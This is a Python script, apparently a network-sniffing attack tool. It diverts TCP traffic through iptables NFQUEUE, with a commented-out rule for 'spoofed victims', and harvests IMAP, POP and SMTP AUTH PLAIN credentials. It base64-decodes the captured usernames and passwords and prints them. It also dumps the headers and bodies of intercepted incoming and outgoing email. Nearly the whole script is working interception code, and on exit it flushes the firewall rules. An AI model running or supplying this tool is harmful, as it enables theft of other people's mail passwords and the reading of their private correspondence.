#!/usr/bin/python

#Note: this script only tested with bluehost IMAP and POP connections, no other email provider so probably different headers for different clients

from scapy.all import *
conf.verb=0
#Below is necessary to receive a response to the DHCP packets because we're sending to 255.255.255.255 but receiving from the IP of the DHCP server
conf.checkIPaddr=0
import os
import nfqueue
import base64

W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan

#These two below are for testing on the local machine
os.system('/sbin/iptables -A OUTPUT -p tcp -j NFQUEUE')
os.system('/sbin/iptables -A INPUT -p tcp -j NFQUEUE')
#This is for spoofed victims
#os.system('/sbin/iptables -A FORWARD -p tcp -j NFQUEUE')

#victimIP is the local IP when testing the script on a local machine
victimIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
#victimIP = raw_input('Type the spoofed client\'s IP:')
IMAPauth = 0
IMAPdest = ''
POPauth = 0
POPdest = ''
headersFound = []

def cb(payload):
	global headersFound
	pkt = IP(payload.get_data())
	if pkt.haslayer(TCP) and pkt.haslayer(Raw):
		dport = pkt[TCP].dport
		sport = pkt[TCP].sport
		mail_ports = [143, 110, 26]
		if dport in mail_ports or sport in mail_ports:
			load = repr(pkt[Raw].load)
			try:
				headers, body = load.split(r"\r\n\r\n", 1)
			except:
				headers = load
				body = ''
			header_lines = headers.split(r"\r\n")
			email_headers = ['Date: ', 'Subject: ', 'To: ', 'From: ']
#			FIND PASSWORDS
			if dport in [110, 143, 26]:
				passwords(pkt, load, dport)
#			Find OUTGOING messages
			if dport == 26:
				outgoing(load, body, header_lines, email_headers)
#			Find INCOMING msgs
			if sport in [110, 143]:
				incoming(headers, body, header_lines, email_headers)

def passwords(pkt, load, dport):
	global IMAPdest, IMAPauth, POPdest, POPauth
	if dport == 143:
		if IMAPauth == 1 and pkt[IP].src == victimIP and pkt[IP].dst == IMAPdest:
			print R,'IMAP user and pass found:',load,W
			decode(load, dport)
			IMAPauth = 0
			IMAPdest = ''
		if "authenticate plain" in load:
			IMAPauth = 1
			IMAPdest = pkt[IP].dst
	if dport == 110:
		if POPauth == 1 and pkt[IP].src == victimIP and pkt[IP].dst == POPdest:
			print R,'POP user and pass found:',load,W
			decode(load, dport)
			POPauth = 0
			POPdest = ''
		if "AUTH PLAIN" in load:
			POPauth = 1
			POPdest = pkt[IP].dst
	if dport == 26:
		if 'AUTH PLAIN ' in load:
			print R,'POP authentication found:',load,W
			decode(load, dport)

def outgoing(headers, body, header_lines, email_headers):
	global headersFound
	if 'Message-ID' in headers:
		for l in header_lines:
			for x in email_headers:
				if x in l:
					headersFound.append(l)
		if len(headersFound) > 3:
			print O,'[!] OUTGOING MESSAGE',W
			for x in headersFound:
				print O,'	',x,W
			headersFound = []
			if body != '':
				print O,'	Message:',body,W

def incoming(headers, body, header_lines, email_headers):
	global headersFound
	if 'FETCH' not in headers:
		for l in header_lines:
			for x in email_headers:
				if x in l:
					headersFound.append(l)
		if len(headersFound) > 3:
			print O,'[!] INCOMING MESSAGE',W
			for x in headersFound:
				print O,'	',x,W
			headersFound = []
			if body != '':
				try:
					beginning = body.split(r"\r\n")[0]
					message = str(body.split(r"\r\n\r\n", 1)[1:]).replace('[', '', 1).replace("'", "", 1)
					message = message.split(beginning)[0]
					print O,'	Message:', message,W
				except:
					print O,'	Couldn\'t format message body:', body,W

def decode(load, dport):
	if dport == 26:
		try:
			b64str = load.replace("'AUTH PLAIN ", "").replace(r"\r\n'", "")
			b64decode = base64.b64decode(b64str)
			print R,'  POP user and pass decoded:',b64decode,W
		except:
			pass
	else:
		try:
			b64str = load.replace("'", "").replace(r"\r\n", '')
			b64decode = base64.b64decode(b64str)
			print R,'  User and pass decoded:',b64decode,W
		except:
			pass

q = nfqueue.queue()
q.open()
q.bind(socket.AF_INET)
q.set_callback(cb)
q.fast_open(0, socket.AF_INET)

try:
	q.try_run()
	os.system('iptables -F')
	print 'Flushed iptables'
	q.unbind(socket.AF_INET)
	q.close()
except KeyboardInterrupt:
	print 'trl-C: Exiting...'
	os.system('iptables -F')
	os.system('iptables -t nat -F')
	q.unbind(socket.AF_INET)
	q.close()

